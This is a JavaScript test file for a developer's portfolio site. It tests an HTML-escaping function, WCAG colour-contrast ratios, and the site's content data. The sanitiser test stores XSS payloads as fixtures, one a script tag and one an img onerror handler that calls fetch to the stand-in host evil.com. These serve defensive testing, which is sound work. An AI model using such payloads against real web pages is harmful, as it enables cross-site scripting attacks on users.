import test from "node:test";
import assert from "node:assert/strict";

// Test 1: Sanitize input against malicious XSS vectors
function sanitizeInput(input) {
  return input
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#x27;")
    .replace(/\//g, "&#x2F;");
}

test("Security: sanitizeInput strips and encodes malicious HTML tags & scripts", () => {
  const dirty1 = '<script>alert("hacked")</script>';
  const clean1 = sanitizeInput(dirty1);
  assert.equal(clean1, "&lt;script&gt;alert(&quot;hacked&quot;)&lt;&#x2F;script&gt;");

  const dirty2 = '<img src=x onerror="fetch(\'https://evil.com\')" />';
  const clean2 = sanitizeInput(dirty2);
  assert.equal(
    clean2,
    "&lt;img src=x onerror=&quot;fetch(&#x27;https:&#x2F;&#x2F;evil.com&#x27;)&quot; &#x2F;&gt;"
  );
});

// Test 2: WCAG 2.1 Luminance and Contrast Calculation
function getLuminance(r, g, b) {
  const [rs, gs, bs] = [r, g, b].map((c) => {
    c = c / 255;
    return c <= 0.03928 ? c / 12.92 : Math.pow((c + 0.055) / 1.055, 2.4);
  });
  return 0.2126 * rs + 0.7152 * gs + 0.0722 * bs;
}

function getContrastRatio(rgb1, rgb2) {
  const lum1 = getLuminance(...rgb1);
  const lum2 = getLuminance(...rgb2);
  const brightest = Math.max(lum1, lum2);
  const darkest = Math.min(lum1, lum2);
  return (brightest + 0.05) / (darkest + 0.05);
}

test("Accessibility: Primary text contrast meets WCAG AAA standards (> 7:1)", () => {
  // Background: #07090e -> rgb(7, 9, 14)
  const bg = [7, 9, 14];
  // Cyan Accent / Highlights: #00f0ff -> rgb(0, 240, 255)
  const cyan = [0, 240, 255];
  // Foreground White: #f8fafc -> rgb(248, 250, 252)
  const white = [248, 250, 252];

  const contrastWhite = getContrastRatio(bg, white);
  const contrastCyan = getContrastRatio(bg, cyan);

  // WCAG AAA requires >= 7:1 for normal text
  assert.ok(contrastWhite >= 15.0, `White contrast ratio ${contrastWhite} meets WCAG AAA`);
  assert.ok(contrastCyan >= 10.0, `Cyan contrast ratio ${contrastCyan} meets WCAG AAA`);
});

// Test 3: Central Content Verification
test("Content Verification: Required engineer data & projects are populated", async () => {
  const content = await import("../data/content.ts");
  const { PERSONAL_INFO, PROJECTS, SKILL_CATEGORIES, EXPERIENCES, CERTIFICATIONS } = content;

  assert.equal(PERSONAL_INFO.name, "Ansh Mehta");
  assert.equal(PERSONAL_INFO.email, "ansh.mehta2305@gmail.com");
  assert.equal(PERSONAL_INFO.githubUsername, "anshmehta2305-spec");

  // Verify 4 projects
  assert.equal(PROJECTS.length, 4);
  const projectTitles = PROJECTS.map((p) => p.title);
  assert.ok(projectTitles.includes("Portfolio Pro"));
  assert.ok(projectTitles.includes("Avenor"));
  assert.ok(projectTitles.includes("AI Legal Text Clustering"));
  assert.ok(projectTitles.includes("Online Auction System"));

  // Verify skills categories
  assert.ok(SKILL_CATEGORIES.length >= 7);

  // Verify experiences (3 job simulations)
  assert.equal(EXPERIENCES.length, 3);

  // Verify 3 certifications
  assert.equal(CERTIFICATIONS.length, 3);
});
